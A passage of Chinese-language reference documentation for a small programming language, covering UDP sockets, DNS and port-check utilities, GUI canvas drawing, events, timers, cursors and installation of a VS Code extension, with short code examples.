|------|------|--------|
| `udp_create()` | 创建UDP套接字 | `i32` — 套接字 |
| `udp_bind(sock, port)` | 绑定到端口 | `i32` — 0 = 成功 |
| `udp_send(sock, host, port, data)` | 发送数据 | `i32` — 发送的字节数 |
| `udp_recv(sock, max_size)` | 接收数据 | `str` |
| `udp_close(sock)` | 关闭 | — |

```
let sock: i32 = udp_create();
udp_send(sock, "127.0.0.1", 9999, "Hello UDP!");
udp_close(sock);
```

---

## 28. 网络工具

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `dns_resolve(hostname)` | DNS解析为IP | `str` |
| `port_check(host, port, timeout_ms)` | 检查端口 | `i32` — 1 = 开放 |

```
let ip: str = dns_resolve("google.com");
let open: i32 = port_check(ip, 443, 3000);
```

---

## 29. GUI画布（绘图）

| 函数 | 描述 |
|------|------|
| `gui_canvas_init(win)` | 初始化窗口的画布 |
| `gui_canvas_clear(win, r, g, b)` | 用颜色清除画布 |
| `gui_canvas_refresh(win)` | 刷新显示 |
| `gui_draw_rect(win, x, y, w, h, r, g, b)` | 填充矩形 |
| `gui_draw_rect_outline(win, x, y, w, h, r, g, b)` | 矩形轮廓 |
| `gui_draw_circle(win, cx, cy, radius, r, g, b)` | 填充圆 |
| `gui_draw_line(win, x1, y1, x2, y2, r, g, b, thickness)` | 线条 |
| `gui_draw_text(win, text, x, y, r, g, b, font, size)` | 文本 |
| `gui_draw_text_bold(win, text, x, y, r, g, b, font, size)` | 粗体文本 |
| `gui_draw_pixel(win, x, y, r, g, b)` | 单个像素 |
| `gui_draw_image(win, filename, x, y, w, h)` | 加载BMP图像 |

```
gui_canvas_init(win);
gui_canvas_clear(win, 0, 0, 0);
gui_draw_rect(win, 10, 10, 100, 50, 255, 0, 0);
gui_draw_circle(win, 200, 200, 50, 0, 255, 0);
gui_draw_line(win, 0, 0, 400, 300, 255, 255, 255, 2);
gui_draw_text(win, "Hello!", 50, 50, 255, 255, 255, "Arial", 24);
gui_draw_image(win, "sprite.bmp", 100, 100, 64, 64);
gui_canvas_refresh(win);
```

---

## 30. GUI事件v2

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `gui_poll_event()` | 获取事件 | `i32` — 1 = 有事件 |
| `gui_get_event_id()` | 元素ID | `i32` |
| `gui_get_event_type()` | 事件类型 | `i32` |
| `gui_get_event_mouse_x()` | 事件时的鼠标X | `i32` |
| `gui_get_event_mouse_y()` | 事件时的鼠标Y | `i32` |
| `gui_get_event_key()` | 键码 | `i32` |
| `gui_get_mouse_x()` | 当前鼠标X | `i32` |
| `gui_get_mouse_y()` | 当前鼠标Y | `i32` |
| `gui_is_mouse_down()` | 左键按下 | `i32` — 1 = 是 |
| `gui_is_mouse_right_down()` | 右键按下 | `i32` — 1 = 是 |

### 事件类型

| 常量 | 值 | 描述 |
|------|----|------|
| `CLICK` | 1 | 按钮或鼠标点击 |
| `CHANGE` | 2 | 文本更改 |
| `MOUSE_MOVE` | 3 | 鼠标移动 |
| `MOUSE_DOWN` | 4 | 鼠标按下 |
| `MOUSE_UP` | 5 | 鼠标释放 |
| `KEY_DOWN` | 6 | 键按下 |
| `KEY_UP` | 7 | 键释放 |
| `TIMER` | 8 | 定时器事件 |
| `CLOSE` | 9 | 窗口关闭 |
| `PAINT` | 10 | 重绘 |
| `DOUBLE_CLICK` | 11 | 双击 |
| `MOUSE_WHEEL` | 12 | 鼠标滚轮 |
| `FOCUS` | 13 | 元素焦点 |
| `RESIZE` | 14 | 窗口大小改变 |

```
while gui_update(win) == 1 {
    while gui_poll_event() == 1 {
        let etype: i32 = gui_get_event_type();
        let mx: i32 = gui_get_event_mouse_x();
        let my: i32 = gui_get_event_mouse_y();

        if etype == 1 {
            println("Click at %d, %d", mx, my);
        }
        if etype == 6 {
            let key: i32 = gui_get_event_key();
            println("Key pressed: %d", key);
        }
        if etype == 8 {
            println("Timer tick!");
        }
    }
    sleep_ms(16);
}
```

---

## 31. GUI定时器

| 函数 | 描述 |
|------|------|
| `gui_set_timer(win, ms)` | 启动定时器（毫秒间隔） |
| `gui_stop_timer(win)` | 停止定时器 |

```
gui_set_timer(win, 50);

while gui_update(win) == 1 {
    while gui_poll_event() == 1 {
        if gui_get_event_type() == 8 {
            // 定时器触发 - 更新游戏
        }
    }
}

gui_stop_timer(win);
```

---

## 32. GUI光标

| 函数 | 描述 |
|------|------|
| `gui_set_cursor(type)` | 更改光标 |

| 类型 | 值 | 描述 |
|------|----|------|
| 0 | 箭头 | 默认 |
| 1 | 手型 | 用于按钮 |
| 2 | 十字 | 用于绘图 |
| 3 | 文本 | 用于输入 |
| 4 | 等待 | 加载中 |

```
gui_set_cursor(1);
```

---

## 33. VS Code扩展

### 安装

1. 如果没有Node.js，从这里安装：https://nodejs.org/en/download（.msi安装程序）
2. 打开VS Code
3. 按Ctrl+Shift+P
4. 输入 `Extensions: Install from VSIX...`
5. 选择 `.vsix` 文件

### 功能特性

- 所有关键词语法高亮
- 内置函数按类别高亮
- 自动闭合括号和引号
- 代码片段：`main`、`fn`、`for`、`if`、`try`、`struct`、`httpget`、`guiwin`、`tcp`、`timer`等
- "Kl+ Dark"深色主题

---

**最新版本语言下载请查看 Releases (.exe)**
